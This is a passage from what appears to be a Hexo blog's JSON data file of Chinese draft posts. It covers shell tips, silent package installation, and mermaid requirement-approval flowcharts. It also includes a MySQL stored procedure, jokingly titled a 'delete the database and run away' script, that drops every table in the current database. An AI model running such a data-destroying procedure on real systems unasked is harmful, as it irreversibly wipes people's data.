class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> shared/error-oracle-license-v1-1:</span><br><span class=\"line\">  oracle-java8-installer/not_exist:</span><br><span class=\"line\">* shared/accepted-oracle-license-v1-1: true</span><br><span class=\"line\">* shared/present-oracle-license-v1-1:</span><br><span class=\"line\">  oracle-java8-installer/local:</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>脚本方式安装时使用预置项，例中为接受证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 设置预置值</span><br><span class=\"line\">echo oracle-java8-installer shared/accepted-oracle-license-v1-1 select true | debconf-set-selections</span><br><span class=\"line\"># 执行安装的过程中会使用该默认值</span><br><span class=\"line\">apt-get install -y oracle-java8-installer</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><p><code>nohup</code> 不挂断运行 </p>\n<p>末尾的<code>&amp;</code> 后台运行（有些程序需要与<code>nohup</code>结合使用） </p>\n<p><code>2&gt;&amp;1</code>      2表示错误输出，1表示标准输出，将错误输出重定向到标准输出 </p>\n<p><code>awk &#39;{print NR}&#39;</code>  打印行数 </p>\n<p><code>awk -F &quot; &quot; &#39;{print $1}&#39;</code>   打印第1列（下标1开始，$0表示完整一行数据），-F指定分割符 </p>\n<p><code>echo -a $lbs_release</code> 查看系统完整版本信息 </p>\n<p><code>eval $cmd</code> cmd字符串作为命令执行 </p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"SHELL笔记\"><a href=\"#SHELL笔记\" class=\"headerlink\" title=\"SHELL笔记\"></a>SHELL笔记</h1><h2 id=\"开机执行\"><a href=\"#开机执行\" class=\"headerlink\" title=\"开机执行\"></a>开机执行</h2><ol>\n<li><code>vim /etc/rc.local</code>  </li>\n<li><code>cd /etc/profile.d</code> </li>\n<li><code>vim ~/.bashrc</code> 仅适用登录用户，非管理员权限 </li>\n<li><code>sudo service cron start</code> + <code>sudo crontab -e</code> + <code>sudo service cron restart</code>  </li>\n</ol>\n<h2 id=\"IF条件\"><a href=\"#IF条件\" class=\"headerlink\" title=\"IF条件\"></a>IF条件</h2><p>单中括号 <code>[3 -gt 2]</code> 是可执行程序等价于<code>test 3 -gt 2</code>  ，处理带空格的字符串的时候会有问题，需使用双括号包裹 <code>d1=&#39;2018-01-02 12:11:00&#39; &amp;&amp; d2=&#39;2018-02-02 12:11:11&#39; &amp;&amp; if [ &quot;$d1&quot; \\&lt; &quot;$d2&quot; ] ; then echo 1; else echo 2; fi;</code></p>\n<p>双中括号<code>d1=&#39;2018-01-02 12:11:00&#39; &amp;&amp; d2=&#39;2018-02-02 12:11:11&#39; &amp;&amp; if [[ $d1 &gt; $d2 ]]; then echo 1; else echo 2; fi;</code> 处理带空格字符串不会有问题 </p>\n<p><code>-gt</code> <code>-lt</code>数值比较大小 </p>\n<p><code>&lt;</code> <code>&gt;</code> 字符串比较大小，在[ ]中需使用<code>\\&lt;</code> <code>\\&gt;</code> 才能正确，否则会被当作重定向 </p>\n<h2 id=\"静默安装\"><a href=\"#静默安装\" class=\"headerlink\" title=\"静默安装\"></a>静默安装</h2><ol>\n<li><p><code>debconf-show</code> 查看可预置项，如：<code>sudo debconf-show oracle-java8-installer</code> 得到如下信息</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> shared/error-oracle-license-v1-1:</span><br><span class=\"line\">  oracle-java8-installer/not_exist:</span><br><span class=\"line\">* shared/accepted-oracle-license-v1-1: true</span><br><span class=\"line\">* shared/present-oracle-license-v1-1:</span><br><span class=\"line\">  oracle-java8-installer/local:</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>脚本方式安装时使用预置项，例中为接受证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 设置预置值</span><br><span class=\"line\">echo oracle-java8-installer shared/accepted-oracle-license-v1-1 select true | debconf-set-selections</span><br><span class=\"line\"># 执行安装的过程中会使用该默认值</span><br><span class=\"line\">apt-get install -y oracle-java8-installer</span><br></pre></td></tr></table></figure>\n\n</li>\n</ol>\n<h2 id=\"指令\"><a href=\"#指令\" class=\"headerlink\" title=\"指令\"></a>指令</h2><p><code>nohup</code> 不挂断运行 </p>\n<p>末尾的<code>&amp;</code> 后台运行（有些程序需要与<code>nohup</code>结合使用） </p>\n<p><code>2&gt;&amp;1</code>      2表示错误输出，1表示标准输出，将错误输出重定向到标准输出 </p>\n<p><code>awk &#39;{print NR}&#39;</code>  打印行数 </p>\n<p><code>awk -F &quot; &quot; &#39;{print $1}&#39;</code>   打印第1列（下标1开始，$0表示完整一行数据），-F指定分割符 </p>\n<p><code>echo -a $lbs_release</code> 查看系统完整版本信息 </p>\n<p><code>eval $cmd</code> cmd字符串作为命令执行 </p>\n"},{"_content":"# mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\n\n## 创建存储过程脚本\n\n```mysql\nDELIMITER $$\nCREATE PROCEDURE `drop_all_tables`()\nBEGIN\n    DECLARE count INT;\n    DECLARE tb VARCHAR(200);\n    DECLARE dbname VARCHAR(200) DEFAULT DATABASE();\n    DECLARE tbnames cursor FOR SELECT CONCAT('DROP TABLE `',dbname,'`.`',table_name,'`') FROM information_schema.tables WHERE table_schema = dbname;\n    SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;\n    OPEN tbnames;\n    loop_i:LOOP\n        IF count = 0 THEN \n            LEAVE loop_i;\n        END IF;\n        FETCH tbnames INTO tb;\n        SET @tb = tb;\n        PREPARE stmt FROM @tb;  \n        EXECUTE stmt;  \n        DEALLOCATE PREPARE stmt;\n        SET count = count - 1;\n\tEND LOOP;\n    CLOSE tbnames;\nEND$$\nDELIMITER ;\n```\n\n## 使用时调用存储过程\n```mysql\ncall drop_all_tables();\n```\n\n## mysql命令行下效果：\n```\nmysql> use test;# 要创建在指定的数据库中才能被调用到\nDatabase changed\nmysql> DELIMITER $$  \nmysql> CREATE PROCEDURE `drop_all_tables`()  \n    -> BEGIN  \n    ->     DECLARE count INT;  \n    ->     DECLARE tb VARCHAR(200);  \n    ->     DECLARE dbname VARCHAR(200) DEFAULT DATABASE();  \n    ->     DECLARE tbnames cursor FOR SELECT CONCAT('DROP TABLE `',dbname,'`.`',table_name,'`') FROM information_schema.tables WHERE table_schema = dbname;  \n    ->     SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;  \n    ->     OPEN tbnames;  \n    ->     loop_i:LOOP  \n    ->         IF count = 0 THEN   \n    ->             LEAVE loop_i;  \n    ->         END IF;  \n    ->         FETCH tbnames INTO tb;  \n    ->         SET @tb = tb;  \n    ->         PREPARE stmt FROM @tb;    \n    ->         EXECUTE stmt;    \n    ->         DEALLOCATE PREPARE stmt;  \n    ->         SET count = count - 1;  \n    ->     END LOOP;  \n    ->     CLOSE tbnames;  \n    -> END$$  \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> DELIMITER ;\nmysql> call drop_all_tables();\nQuery OK, 1 row affected (0.00 sec)\n```\n","source":"_drafts/2017-09-13_mysql_drop_tables.md","raw":"# mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\n\n## 创建存储过程脚本\n\n```mysql\nDELIMITER $$\nCREATE PROCEDURE `drop_all_tables`()\nBEGIN\n    DECLARE count INT;\n    DECLARE tb VARCHAR(200);\n    DECLARE dbname VARCHAR(200) DEFAULT DATABASE();\n    DECLARE tbnames cursor FOR SELECT CONCAT('DROP TABLE `',dbname,'`.`',table_name,'`') FROM information_schema.tables WHERE table_schema = dbname;\n    SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;\n    OPEN tbnames;\n    loop_i:LOOP\n        IF count = 0 THEN \n            LEAVE loop_i;\n        END IF;\n        FETCH tbnames INTO tb;\n        SET @tb = tb;\n        PREPARE stmt FROM @tb;  \n        EXECUTE stmt;  \n        DEALLOCATE PREPARE stmt;\n        SET count = count - 1;\n\tEND LOOP;\n    CLOSE tbnames;\nEND$$\nDELIMITER ;\n```\n\n## 使用时调用存储过程\n```mysql\ncall drop_all_tables();\n```\n\n## mysql命令行下效果：\n```\nmysql> use test;# 要创建在指定的数据库中才能被调用到\nDatabase changed\nmysql> DELIMITER $$  \nmysql> CREATE PROCEDURE `drop_all_tables`()  \n    -> BEGIN  \n    ->     DECLARE count INT;  \n    ->     DECLARE tb VARCHAR(200);  \n    ->     DECLARE dbname VARCHAR(200) DEFAULT DATABASE();  \n    ->     DECLARE tbnames cursor FOR SELECT CONCAT('DROP TABLE `',dbname,'`.`',table_name,'`') FROM information_schema.tables WHERE table_schema = dbname;  \n    ->     SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;  \n    ->     OPEN tbnames;  \n    ->     loop_i:LOOP  \n    ->         IF count = 0 THEN   \n    ->             LEAVE loop_i;  \n    ->         END IF;  \n    ->         FETCH tbnames INTO tb;  \n    ->         SET @tb = tb;  \n    ->         PREPARE stmt FROM @tb;    \n    ->         EXECUTE stmt;    \n    ->         DEALLOCATE PREPARE stmt;  \n    ->         SET count = count - 1;  \n    ->     END LOOP;  \n    ->     CLOSE tbnames;  \n    -> END$$  \nQuery OK, 0 rows affected (0.00 sec)\n\nmysql> DELIMITER ;\nmysql> call drop_all_tables();\nQuery OK, 1 row affected (0.00 sec)\n```\n","slug":"2017-09-13_mysql_drop_tables","published":0,"date":"2020-01-23T08:27:34.173Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0500004g0uk98aexryl","content":"<h1 id=\"mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\"><a href=\"#mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\" class=\"headerlink\" title=\"mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\"></a>mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表</h1><h2 id=\"创建存储过程脚本\"><a href=\"#创建存储过程脚本\" class=\"headerlink\" title=\"创建存储过程脚本\"></a>创建存储过程脚本</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DELIMITER $$</span><br><span class=\"line\">CREATE PROCEDURE `drop_all_tables`()</span><br><span class=\"line\">BEGIN</span><br><span class=\"line\">    DECLARE count INT;</span><br><span class=\"line\">    DECLARE tb VARCHAR(200);</span><br><span class=\"line\">    DECLARE dbname VARCHAR(200) DEFAULT DATABASE();</span><br><span class=\"line\">    DECLARE tbnames cursor FOR SELECT CONCAT(&apos;DROP TABLE `&apos;,dbname,&apos;`.`&apos;,table_name,&apos;`&apos;) FROM information_schema.tables WHERE table_schema = dbname;</span><br><span class=\"line\">    SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;</span><br><span class=\"line\">    OPEN tbnames;</span><br><span class=\"line\">    loop_i:LOOP</span><br><span class=\"line\">        IF count = 0 THEN </span><br><span class=\"line\">            LEAVE loop_i;</span><br><span class=\"line\">        END IF;</span><br><span class=\"line\">        FETCH tbnames INTO tb;</span><br><span class=\"line\">        SET @tb = tb;</span><br><span class=\"line\">        PREPARE stmt FROM @tb;  </span><br><span class=\"line\">        EXECUTE stmt;  </span><br><span class=\"line\">        DEALLOCATE PREPARE stmt;</span><br><span class=\"line\">        SET count = count - 1;</span><br><span class=\"line\">\tEND LOOP;</span><br><span class=\"line\">    CLOSE tbnames;</span><br><span class=\"line\">END$$</span><br><span class=\"line\">DELIMITER ;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用时调用存储过程\"><a href=\"#使用时调用存储过程\" class=\"headerlink\" title=\"使用时调用存储过程\"></a>使用时调用存储过程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call drop_all_tables();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"mysql命令行下效果：\"><a href=\"#mysql命令行下效果：\" class=\"headerlink\" title=\"mysql命令行下效果：\"></a>mysql命令行下效果：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; use test;# 要创建在指定的数据库中才能被调用到</span><br><span class=\"line\">Database changed</span><br><span class=\"line\">mysql&gt; DELIMITER $$  </span><br><span class=\"line\">mysql&gt; CREATE PROCEDURE `drop_all_tables`()  </span><br><span class=\"line\">    -&gt; BEGIN  </span><br><span class=\"line\">    -&gt;     DECLARE count INT;  </span><br><span class=\"line\">    -&gt;     DECLARE tb VARCHAR(200);  </span><br><span class=\"line\">    -&gt;     DECLARE dbname VARCHAR(200) DEFAULT DATABASE();  </span><br><span class=\"line\">    -&gt;     DECLARE tbnames cursor FOR SELECT CONCAT(&apos;DROP TABLE `&apos;,dbname,&apos;`.`&apos;,table_name,&apos;`&apos;) FROM information_schema.tables WHERE table_schema = dbname;  </span><br><span class=\"line\">    -&gt;     SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;  </span><br><span class=\"line\">    -&gt;     OPEN tbnames;  </span><br><span class=\"line\">    -&gt;     loop_i:LOOP  </span><br><span class=\"line\">    -&gt;         IF count = 0 THEN   </span><br><span class=\"line\">    -&gt;             LEAVE loop_i;  </span><br><span class=\"line\">    -&gt;         END IF;  </span><br><span class=\"line\">    -&gt;         FETCH tbnames INTO tb;  </span><br><span class=\"line\">    -&gt;         SET @tb = tb;  </span><br><span class=\"line\">    -&gt;         PREPARE stmt FROM @tb;    </span><br><span class=\"line\">    -&gt;         EXECUTE stmt;    </span><br><span class=\"line\">    -&gt;         DEALLOCATE PREPARE stmt;  </span><br><span class=\"line\">    -&gt;         SET count = count - 1;  </span><br><span class=\"line\">    -&gt;     END LOOP;  </span><br><span class=\"line\">    -&gt;     CLOSE tbnames;  </span><br><span class=\"line\">    -&gt; END$$  </span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; DELIMITER ;</span><br><span class=\"line\">mysql&gt; call drop_all_tables();</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\"><a href=\"#mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\" class=\"headerlink\" title=\"mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表\"></a>mysql删除所有表，不删除数据库——删库跑路小脚本，用存储过程删除全部表</h1><h2 id=\"创建存储过程脚本\"><a href=\"#创建存储过程脚本\" class=\"headerlink\" title=\"创建存储过程脚本\"></a>创建存储过程脚本</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DELIMITER $$</span><br><span class=\"line\">CREATE PROCEDURE `drop_all_tables`()</span><br><span class=\"line\">BEGIN</span><br><span class=\"line\">    DECLARE count INT;</span><br><span class=\"line\">    DECLARE tb VARCHAR(200);</span><br><span class=\"line\">    DECLARE dbname VARCHAR(200) DEFAULT DATABASE();</span><br><span class=\"line\">    DECLARE tbnames cursor FOR SELECT CONCAT(&apos;DROP TABLE `&apos;,dbname,&apos;`.`&apos;,table_name,&apos;`&apos;) FROM information_schema.tables WHERE table_schema = dbname;</span><br><span class=\"line\">    SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;</span><br><span class=\"line\">    OPEN tbnames;</span><br><span class=\"line\">    loop_i:LOOP</span><br><span class=\"line\">        IF count = 0 THEN </span><br><span class=\"line\">            LEAVE loop_i;</span><br><span class=\"line\">        END IF;</span><br><span class=\"line\">        FETCH tbnames INTO tb;</span><br><span class=\"line\">        SET @tb = tb;</span><br><span class=\"line\">        PREPARE stmt FROM @tb;  </span><br><span class=\"line\">        EXECUTE stmt;  </span><br><span class=\"line\">        DEALLOCATE PREPARE stmt;</span><br><span class=\"line\">        SET count = count - 1;</span><br><span class=\"line\">\tEND LOOP;</span><br><span class=\"line\">    CLOSE tbnames;</span><br><span class=\"line\">END$$</span><br><span class=\"line\">DELIMITER ;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"使用时调用存储过程\"><a href=\"#使用时调用存储过程\" class=\"headerlink\" title=\"使用时调用存储过程\"></a>使用时调用存储过程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call drop_all_tables();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"mysql命令行下效果：\"><a href=\"#mysql命令行下效果：\" class=\"headerlink\" title=\"mysql命令行下效果：\"></a>mysql命令行下效果：</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; use test;# 要创建在指定的数据库中才能被调用到</span><br><span class=\"line\">Database changed</span><br><span class=\"line\">mysql&gt; DELIMITER $$  </span><br><span class=\"line\">mysql&gt; CREATE PROCEDURE `drop_all_tables`()  </span><br><span class=\"line\">    -&gt; BEGIN  </span><br><span class=\"line\">    -&gt;     DECLARE count INT;  </span><br><span class=\"line\">    -&gt;     DECLARE tb VARCHAR(200);  </span><br><span class=\"line\">    -&gt;     DECLARE dbname VARCHAR(200) DEFAULT DATABASE();  </span><br><span class=\"line\">    -&gt;     DECLARE tbnames cursor FOR SELECT CONCAT(&apos;DROP TABLE `&apos;,dbname,&apos;`.`&apos;,table_name,&apos;`&apos;) FROM information_schema.tables WHERE table_schema = dbname;  </span><br><span class=\"line\">    -&gt;     SELECT count(*) INTO count FROM information_schema.tables WHERE table_schema = dbname;  </span><br><span class=\"line\">    -&gt;     OPEN tbnames;  </span><br><span class=\"line\">    -&gt;     loop_i:LOOP  </span><br><span class=\"line\">    -&gt;         IF count = 0 THEN   </span><br><span class=\"line\">    -&gt;             LEAVE loop_i;  </span><br><span class=\"line\">    -&gt;         END IF;  </span><br><span class=\"line\">    -&gt;         FETCH tbnames INTO tb;  </span><br><span class=\"line\">    -&gt;         SET @tb = tb;  </span><br><span class=\"line\">    -&gt;         PREPARE stmt FROM @tb;    </span><br><span class=\"line\">    -&gt;         EXECUTE stmt;    </span><br><span class=\"line\">    -&gt;         DEALLOCATE PREPARE stmt;  </span><br><span class=\"line\">    -&gt;         SET count = count - 1;  </span><br><span class=\"line\">    -&gt;     END LOOP;  </span><br><span class=\"line\">    -&gt;     CLOSE tbnames;  </span><br><span class=\"line\">    -&gt; END$$  </span><br><span class=\"line\">Query OK, 0 rows affected (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; DELIMITER ;</span><br><span class=\"line\">mysql&gt; call drop_all_tables();</span><br><span class=\"line\">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n"},{"_content":"## 软件需求流程\n\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-软件负责人\n研发审批-软件负责人--通过-->软件人员实现\n软件人员实现--完成-->测试人员内部验证\n测试人员内部验证--通过-->提单人外部验证\n软件人员实现--完成直接外部验证-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-软件负责人--不通过-->提单人\n测试人员内部验证--不通过-->软件人员实现\n提单人外部验证--不通过-->软件人员实现\n```\n\n\n## 硬件需求流程\n\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-硬件负责人\n研发审批-硬件负责人--通过-->硬件人员实现\n硬件人员实现--完成-->测试人员内部验证\n测试人员内部验证--通过-->提单人外部验证\n硬件人员实现--完成直接外部验证-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-硬件负责人--不通过-->提单人\n测试人员内部验证--不通过-->硬件人员实现\n提单人外部验证--不通过-->硬件人员实现\n```\n\n## 工业设计需求流程\n\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-工业设计负责人\n研发审批-工业设计负责人--通过-->工业设计人员实现\n工业设计人员实现--完成-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-工业设计负责人--不通过-->提单人\n提单人外部验证--不通过-->工业设计人员实现\n```\n\n\n## UI设计需求流程\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-UI设计组长\n研发审批-UI设计组长--通过-->UI设计人员实现\nUI设计人员实现--完成-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-UI设计组长--不通过-->提单人\n提单人外部验证--不通过-->UI设计人员实现\n```\n\n\n\n","source":"_drafts/2019-06-19_md_mermaid.md","raw":"## 软件需求流程\n\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-软件负责人\n研发审批-软件负责人--通过-->软件人员实现\n软件人员实现--完成-->测试人员内部验证\n测试人员内部验证--通过-->提单人外部验证\n软件人员实现--完成直接外部验证-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-软件负责人--不通过-->提单人\n测试人员内部验证--不通过-->软件人员实现\n提单人外部验证--不通过-->软件人员实现\n```\n\n\n## 硬件需求流程\n\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-硬件负责人\n研发审批-硬件负责人--通过-->硬件人员实现\n硬件人员实现--完成-->测试人员内部验证\n测试人员内部验证--通过-->提单人外部验证\n硬件人员实现--完成直接外部验证-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-硬件负责人--不通过-->提单人\n测试人员内部验证--不通过-->硬件人员实现\n提单人外部验证--不通过-->硬件人员实现\n```\n\n## 工业设计需求流程\n\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-工业设计负责人\n研发审批-工业设计负责人--通过-->工业设计人员实现\n工业设计人员实现--完成-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-工业设计负责人--不通过-->提单人\n提单人外部验证--不通过-->工业设计人员实现\n```\n\n\n## UI设计需求流程\n```mermaid\ngraph LR\n提单人--发出-->产品经理审批\n产品经理审批--通过-->研发审批-项目经理\n研发审批-项目经理--通过-->研发审批-UI设计组长\n研发审批-UI设计组长--通过-->UI设计人员实现\nUI设计人员实现--完成-->提单人外部验证\n提单人外部验证--通过-->处理完毕\n产品经理审批--不通过-->提单人\n研发审批-项目经理--不通过-->提单人\n研发审批-UI设计组长--不通过-->提单人\n提单人外部验证--不通过-->UI设计人员实现\n```\n\n\n\n","slug":"2019-06-19_md_mermaid","published":0,"date":"2020-01-23T08:27:34.001Z","updated":"2020-01-23T08:21:31.000Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"ck5qhi0530005g0ukmvibl8jn","content":"<h2 id=\"软件需求流程\"><a href=\"#软件需求流程\" class=\"headerlink\" title=\"软件需求流程\"></a>软件需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-软件负责人</span><br><span class=\"line\">研发审批-软件负责人--通过--&gt;软件人员实现</span><br><span class=\"line\">软件人员实现--完成--&gt;测试人员内部验证</span><br><span class=\"line\">测试人员内部验证--通过--&gt;提单人外部验证</span><br><span class=\"line\">软件人员实现--完成直接外部验证--&gt;提单人外部验证</span><br><span class=\"line\">提单人外部验证--通过--&gt;处理完毕</span><br><span class=\"line\">产品经理审批--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-项目经理--不通过--&gt;提单人</span><br><span class=\"line\">研发审批-软件负责人--不通过--&gt;提单人</span><br><span class=\"line\">测试人员内部验证--不通过--&gt;软件人员实现</span><br><span class=\"line\">提单人外部验证--不通过--&gt;软件人员实现</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"硬件需求流程\"><a href=\"#硬件需求流程\" class=\"headerlink\" title=\"硬件需求流程\"></a>硬件需求流程</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">graph LR</span><br><span class=\"line\">提单人--发出--&gt;产品经理审批</span><br><span class=\"line\">产品经理审批--通过--&gt;研发审批-项目经理</span><br><span class=\"line\">研发审批-项目经理--通过--&gt;研发审批-硬件负责人</span><br><span class=\"line\">研发审批-硬件负责人--通过--&gt;硬件人员实现</span><br><span 